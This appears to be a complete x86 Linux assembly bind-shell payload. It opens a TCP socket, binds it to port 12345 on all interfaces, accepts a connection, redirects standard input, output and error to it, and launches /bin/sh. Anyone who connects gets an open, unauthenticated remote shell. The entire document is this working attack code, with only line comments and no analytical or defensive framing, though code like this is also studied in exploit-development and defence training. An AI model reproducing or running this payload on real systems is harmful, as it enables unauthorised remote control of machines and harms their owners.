global _start
section .text
_start:




mov eax, 102          ; syscall 102 - socketcall 
mov ebx, 1            ; socketcall type (sys_socket 1)


push 0                ; IPPROTO_IP = 0
push 1                ; SOCK_STREAM = 1 
push 2                ; AF_INET = 2 

mov ecx, esp          
int 0x80             

mov edx, eax         


mov eax, 102           ; syscall 102 - socketcall 
mov ebx, 2             ; socketcall type (sys_bind 2)

; building the sockaddr_in 
push 0                 ; INADDR_ANY = 0 
push WORD 0x3930       ; port = 12345 
push WORD 2            ; AF_INET = 2 

mov ecx, esp          


; bind arguments 
push 16                ; sockaddr struct size 
push ecx               ; sockaddr_in struct pointer
push edx               ; socket fd 

mov ecx, esp          

int 0x80               

;int listen(int sockfd, int backlog); ; listen(sockfd, 0);
mov eax, 102           ; syscall 102 - socketcall 
mov ebx, 4             ; socketcall type (sys_listen 4)


push 0                 ; backlog (connections queue size) 
push edx               ; socket fd

mov ecx, esp           

int 0x80               


; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); 
mov eax, 102            ; syscall 102 - socketcall
mov ebx, 5              ; socketcall type (sys_accept 5)


push 0                 
push 0                 
push edx               

mov ecx, esp     
      
int 0x80              

mov edx, eax           


; int dup2(int oldfd, int newfd); 
mov eax, 63            ; syscall 63 - dup2 
mov ebx, edx         
mov ecx, 0 
int 0x80              

mov eax, 63
mov ecx, 1             
int 0x80

mov eax, 63
mov ecx, 2             
int 0x80 


; int execve(const char *filename, char *const argv[], char *const envp[]); 
 mov eax, 11          ; execve syscall


push 0                ; null byte 

push 0x68732f6e       ; n/sh 
push 0x69622f2f       ; //bi

mov ebx, esp          ; ptr to "//bin/sh" string 
mov ecx, 0            ; null  
mov edx, 0            ; null 

int 0x80

